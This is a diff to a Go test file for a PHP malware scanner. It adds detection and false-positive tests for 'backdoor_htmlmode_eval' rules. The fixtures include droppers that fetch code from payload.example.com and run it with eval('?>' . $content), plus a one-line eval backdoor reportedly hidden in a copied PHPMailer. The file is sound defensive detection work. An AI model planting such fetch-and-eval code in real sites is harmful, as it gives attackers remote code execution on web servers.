@@ -1,13 +1,19 @@
 package signatures
 
-import "testing"
+import (
+	"os"
+	"path/filepath"
+	"strings"
+	"testing"
+)
 
 // Production sample (2026-07-29, staged as index.phps in a WordPress docroot):
 // the remote fetch lives in a helper function and the payload runs with an
 // HTML-mode prefix, so neither the curl_exec-adjacent pattern nor the
-// eval-wrapping pattern sees it. The fetch and the execution sit tens of lines
-// apart and the eval argument is a string literal, not the fetched variable.
-func TestDropperRemoteHtmlmodeEval_FetchHelper(t *testing.T) {
+// eval-wrapping pattern in dropper_curl_eval sees it. The fetch and the
+// execution sit tens of lines apart and the eval argument is a string literal,
+// not the fetched variable.
+func TestBackdoorHtmlmodeEval_RemoteFetchHelper(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
 	malicious := []byte(`<?php
@@ -15,8 +21,6 @@ function fetchContent($url) {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
 
     $content = curl_exec($ch);
@@ -34,9 +38,29 @@ if ($content !== false) {
 }
 `)
 
-	matches := scanner.ScanContent(malicious, ".php")
-	if !hasRule(matches, "dropper_remote_htmlmode_eval") {
-		t.Error("dropper_remote_htmlmode_eval miss: remote fetch helper feeding eval('?>' . $var) was not detected")
+	if !hasRule(scanner.ScanContent(malicious, ".php"), "backdoor_htmlmode_eval") {
+		t.Error("backdoor_htmlmode_eval miss: remote fetch feeding eval('?>' . $var) was not detected")
+	}
+}
+
+// Production sample (planted 2024-07-22, found 2026-08-17 as two identical
+// copies on one account): a copied PHPMailer with one line appended deep inside
+// it. There is no URL and no fetch -- the payload is rebuilt through an
+// indirect call, so the decoder branch is what carries this one.
+func TestBackdoorHtmlmodeEval_IndirectCallPayload(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	malicious := []byte(`<?php
+class SMTP {
+    public function client_send($data, $command) {
+        $this->setError('');
+        eval('?>' . call_user_func($_b64, base64_encode($_out)));
+    }
+}
+`)
+
+	if !hasRule(scanner.ScanContent(malicious, ".php"), "backdoor_htmlmode_eval") {
+		t.Error("backdoor_htmlmode_eval miss: indirect-call payload rebuild was not detected")
 	}
 }
 
@@ -49,75 +73,82 @@ func TestScannerTreatsPhpsAsPHPSource(t *testing.T) {
 
 	malicious := []byte("<?php\neval(curl_exec($ch));\n")
 
-	matches := scanner.ScanContent(malicious, ".phps")
-	if !hasRule(matches, "dropper_curl_eval") {
+	if !hasRule(scanner.ScanContent(malicious, ".phps"), "dropper_curl_eval") {
 		t.Error("dropper_curl_eval miss: .phps content was not matched against PHP rules")
+	}
+}
+
+func TestScanFileTreatsPhpsAsPHPSource(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	target := filepath.Join(t.TempDir(), "payload.PHPS")
+	if err := os.WriteFile(target, []byte("<?php eval(curl_exec($ch));"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	if matches := scanner.ScanFile(target, 1<<20); !hasRule(matches, "dropper_curl_eval") {
+		t.Error("dropper_curl_eval miss: ScanFile did not canonicalize the .PHPS source extension")
 	}
 }
 
 // A staged dropper keeps the same content under an extension a stock handler
 // renders as source. Content scanning must not go blind on the extension alone.
-func TestDropperRemoteHtmlmodeEval_UnderPhpsExtension(t *testing.T) {
+func TestBackdoorHtmlmodeEval_UnderPhpsExtension(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
 	malicious := []byte(`<?php
 $ch = curl_init('https://payload.example.com/x');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $content = curl_exec($ch);
 eval('?>' . $content);
 `)
 
-	matches := scanner.ScanContent(malicious, ".phps")
-	if !hasRule(matches, "dropper_remote_htmlmode_eval") {
-		t.Error("dropper_remote_htmlmode_eval miss: staged .phps payload was not scanned as PHP")
+	if !hasRule(scanner.ScanContent(malicious, ".phps"), "backdoor_htmlmode_eval") {
+		t.Error("backdoor_htmlmode_eval miss: staged .phps payload was not scanned as PHP")
 	}
 }
 
-// An HTTP client helper next to an unrelated template evaluator carries a
-// remote fetch and an eval with no data flow between them, and no HTML-mode
-// prefix. Neither dropper rule may fire.
-func TestDropperRemoteHtmlmodeEval_HttpClientAndTemplateEvaluator(t *testing.T) {
+// Twig's Environment.php is the most common carrier of this idiom in the wild:
+// it ships inside Elementor, WPML, MailPoet and Breakdance, so it sits on most
+// WordPress hosts many times over. It evaluates a local template and never
+// reaches the network, which is what both branches require.
+func TestBackdoorHtmlmodeEval_TwigStyleLocalTemplate(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
 	legit := []byte(`<?php
-class HttpClient {
-    public function get($url) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $body = curl_exec($ch);
-        curl_close($ch);
-        return $body;
-    }
-}
-
-class TemplateCompiler {
-    public function render($compiledSource) {
-        return eval($compiledSource);
+final class Environment {
+    public function render($name, array $context = [])
+    {
+        $source = $this->getLoader()->getSourceContext($name)->getCode();
+        return eval('?>' . $this->compileSource($source));
     }
 }
 `)
 
-	matches := scanner.ScanContent(legit, ".php")
-	for _, rule := range []string{"dropper_remote_htmlmode_eval", "dropper_curl_eval"} {
-		if hasRule(matches, rule) {
-			t.Errorf("%s FP: HTTP client and template evaluator have no data flow between fetch and eval", rule)
-		}
+	if hasRule(scanner.ScanContent(legit, ".php"), "backdoor_htmlmode_eval") {
+		t.Error("backdoor_htmlmode_eval FP: a local template evaluator is not a backdoor")
 	}
 }
 
-// A local template engine that leaves PHP mode around a template it read off
-// disk has the HTML-mode idiom but no network fetch. The corroboration
-// requirement is what keeps it clean.
-func TestDropperRemoteHtmlmodeEval_LocalTemplateEvaluator(t *testing.T) {
+// Documentation links live in docblocks throughout template engines, so a URL
+// literal somewhere in the file must not be enough on its own -- it has to sit
+// within the window before the eval.
+func TestBackdoorHtmlmodeEval_DocblockURLFarFromEval(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
 	legit := []byte(`<?php
-$template = file_get_contents(__DIR__ . '/views/page.tpl');
-eval('?>' . $template);
+/**
+ * Template compiler.
+ *
+ * @see https://twig.symfony.com/doc/3.x/api.html
+ */
+class Compiler {
+    private $notes = '` + strings.Repeat("a", 600) + `';
+    public function render($tpl) {
+        return eval('?>' . $tpl);
+    }
+}
 `)
 
-	matches := scanner.ScanContent(legit, ".php")
-	if hasRule(matches, "dropper_remote_htmlmode_eval") {
-		t.Error("dropper_remote_htmlmode_eval FP: local template read off disk is not a remote payload")
+	if hasRule(scanner.ScanContent(legit, ".php"), "backdoor_htmlmode_eval") {
+		t.Error("backdoor_htmlmode_eval FP: a docblock URL far from the eval is not remote provenance")
 	}
 }
